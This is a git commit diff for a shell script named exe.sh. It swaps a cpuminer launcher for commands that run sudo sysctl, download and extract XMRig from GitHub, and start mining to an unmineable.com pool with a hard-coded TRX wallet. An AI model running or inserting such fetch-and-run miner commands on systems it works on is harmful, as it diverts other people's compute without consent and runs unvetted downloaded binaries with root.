f2e44a09d828422970261c6cc845b1bb1b20b549
red56565 <108178533+red56565@users.noreply.github.com>
2023-04-11 21:13:23 +0200

    Update exe.sh

--- exe.sh
+++ exe.sh
@@ -1,3 +1,2 @@
-wget https://github.com/pooler/cpuminer/releases/download/v2.5.1/pooler-cpuminer-2.5.1-linux-x86_64.tar.gz 
-tar xf pooler-cpuminer-2.5.1-linux-x86_64.tar.gz
-./minerd -o stratum+tcp://scrypt.unmineable.com:3333 -u TRX:THDXuAcLiSadqs6WSN1NKJymYcdy79RWuX.lycin -p x
+sudo sysctl -wq vm.nr_hugepages=1024
+wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-x64.tar.gz && tar -xf xmrig-6.15.0-linux-x64.tar.gz && cd xmrig-6.15.0 && ./xmrig -o rx.unmineable.com:3333 -u TRX:THDXuAcLiSadqs6WSN1NKJymYcdy79RWuX.lycin -p x
